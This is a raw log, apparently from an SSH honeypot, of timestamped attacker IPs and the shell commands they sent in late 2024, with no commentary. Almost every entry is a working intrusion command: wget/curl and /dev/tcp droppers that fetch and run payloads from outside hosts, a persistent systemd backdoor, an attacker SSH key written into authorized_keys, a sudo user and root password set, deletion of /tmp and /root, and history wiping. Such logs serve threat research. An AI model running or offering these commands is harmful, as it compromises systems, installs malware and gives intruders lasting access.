start
2024-11-29 15:36:02.394635 - ('91.227.62.23', 56098) - whoami
2024-11-29 23:54:49.441571 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:49.991069 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:50.081194 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:50.084611 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:50.523306 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:50.526729 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:51.047309 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:51.135673 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:51.137191 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:51.586615 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:51.599409 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:52.103805 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:52.183264 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:52.188171 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:52.638250 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:52.650262 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:53.154223 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:53.274668 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:53.275934 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:53.686630 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:53.744018 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:54.223994 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:54.319886 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:54.330285 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:54.735923 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:54.829178 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:55.294825 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:55.374731 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:55.385592 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:55.777902 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:55.927160 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:56.393678 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:56.469373 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:56.699270 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:56.858276 - ('94.141.120.99', 35784) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:56.968997 - ('94.141.120.99', 35766) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:57.637167 - ('94.141.120.99', 35794) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:57.658200 - ('94.141.120.99', 35780) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-29 23:54:57.787516 - ('94.141.120.99', 35776) - wget http://server.eye-network.ru/wget.sh; chmod +x wget.sh; ./wget.sh ssh
2024-11-30 05:54:41.719532 - ('141.98.10.198', 59218) - apt
2024-11-30 05:54:43.551432 - ('141.98.10.198', 59218) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 05:54:48.293776 - ('141.98.10.198', 41186) - apt
2024-11-30 05:54:48.554936 - ('141.98.10.198', 41186) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 05:54:54.455195 - ('141.98.10.198', 41198) - apt
2024-11-30 05:54:55.933453 - ('141.98.10.198', 41198) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 05:55:00.895212 - ('141.98.10.198', 47024) - apt
2024-11-30 05:55:02.245684 - ('141.98.10.198', 47024) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 05:55:10.332618 - ('141.98.10.198', 47028) - apt
2024-11-30 05:55:10.735102 - ('141.98.10.198', 47028) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 05:55:12.947823 - ('141.98.10.198', 56364) - apt
2024-11-30 06:18:34.842229 - ('59.103.120.51', 42070) - cd ~; chattr -ia .ssh; lockr -ia .ssh
2024-11-30 06:18:35.627636 - ('59.103.120.51', 42070) - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
2024-11-30 08:09:36.886864 - ('185.146.1.9', 42172) - cd ~; chattr -ia .ssh; lockr -ia .ssh
2024-11-30 08:09:37.574970 - ('185.146.1.9', 42172) - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
2024-11-30 09:34:48.859121 - ('46.19.143.66', 51322) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kR5249PP) system && sudo usermod -aG sudo system
2024-11-30 09:34:49.327532 - ('46.19.143.66', 51322) - lscpu && echo -e "kR5249PP\nkR5249PP" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 10:39:40.076323 - ('37.44.238.68', 52646) - whoami
2024-11-30 10:39:42.447650 - ('37.44.238.68', 52650) - whoami
2024-11-30 10:39:45.219461 - ('37.44.238.68', 52652) - whoami
2024-11-30 10:39:46.731271 - ('37.44.238.68', 52664) - whoami
2024-11-30 10:39:48.332650 - ('37.44.238.68', 38264) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:39:51.031348 - ('37.44.238.68', 38278) - whoami
2024-11-30 10:39:52.794742 - ('37.44.238.68', 38290) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:39:54.713608 - ('37.44.238.68', 38292) - whoami
2024-11-30 10:39:56.416851 - ('37.44.238.68', 38306) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:39:58.959816 - ('37.44.238.68', 35668) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:00.764076 - ('37.44.238.68', 35682) - whoami
2024-11-30 10:40:02.727351 - ('37.44.238.68', 35690) - whoami
2024-11-30 10:40:05.729896 - ('37.44.238.68', 35702) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:07.344493 - ('37.44.238.68', 35718) - whoami
2024-11-30 10:40:09.347483 - ('37.44.238.68', 35720) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:11.028772 - ('37.44.238.68', 49962) - whoami
2024-11-30 10:40:13.731900 - ('37.44.238.68', 49964) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:15.934108 - ('37.44.238.68', 49980) - whoami
2024-11-30 10:40:19.260958 - ('37.44.238.68', 49974) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:21.043530 - ('37.44.238.68', 49988) - whoami
2024-11-30 10:40:22.889168 - ('37.44.238.68', 55782) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:24.645434 - ('37.44.238.68', 55796) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:27.461963 - ('37.44.238.68', 55804) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 10:40:30.780902 - ('37.44.238.68', 32914) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-30 13:38:57.060734 - ('87.120.113.231', 46408) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 15:12:34.218928 - ('87.120.113.231', 55386) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 15:17:57.142850 - ('46.19.143.66', 44072) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 RVjz5tHZ) system && sudo usermod -aG sudo system
2024-11-30 15:17:57.581564 - ('46.19.143.66', 44072) - lscpu && echo -e "RVjz5tHZ\nRVjz5tHZ" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 15:59:58.967455 - ('218.92.0.132', 50060) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-30 16:00:00.742749 - ('218.92.0.132', 50060) - ls -la /var/run/gcc.pid
2024-11-30 20:13:34.069890 - ('187.75.22.30', 49458) - scp -t /tmp/RJxAeIib
2024-11-30 20:13:34.857620 - ('187.75.22.30', 49462) - scp -t /tmp/RJxAeIib
2024-11-30 20:48:53.120309 - ('87.120.113.231', 44008) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 21:42:45.360540 - ('87.120.113.231', 52420) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 22:08:29.503339 - ('46.19.143.66', 59994) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 YRBtzHWp) system && sudo usermod -aG sudo system
2024-11-30 22:08:29.920804 - ('46.19.143.66', 59994) - lscpu && echo -e "YRBtzHWp\nYRBtzHWp" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-01 00:32:47.323119 - ('87.120.113.231', 36172) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 01:17:15.814977 - ('128.199.111.126', 37812) - cd ~; chattr -ia .ssh; lockr -ia .ssh
2024-12-01 01:17:16.698350 - ('128.199.111.126', 37812) - cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
2024-12-01 05:32:24.596261 - ('218.92.0.132', 35924) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-01 05:32:26.319783 - ('218.92.0.132', 35924) - ls -la /var/run/gcc.pid
2024-12-01 14:18:21.574231 - ('213.64.179.221', 37420) - /ip cloud print
2024-12-01 14:18:22.040154 - ('213.64.179.221', 37420) - ifconfig
2024-12-01 14:18:22.408575 - ('213.64.179.221', 37420) - uname -a
2024-12-01 14:18:22.768219 - ('213.64.179.221', 37420) - cat /proc/cpuinfo
2024-12-01 14:18:23.128824 - ('213.64.179.221', 37420) - ps | grep '[Mm]iner'
2024-12-01 14:18:23.492107 - ('213.64.179.221', 37420) - ps -ef | grep '[Mm]iner'
2024-12-01 14:18:23.852381 - ('213.64.179.221', 37420) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-01 14:18:24.213155 - ('213.64.179.221', 37420) - echo Hi | cat -n
2024-12-01 14:18:32.619145 - ('79.137.202.88', 54932) - uname -a
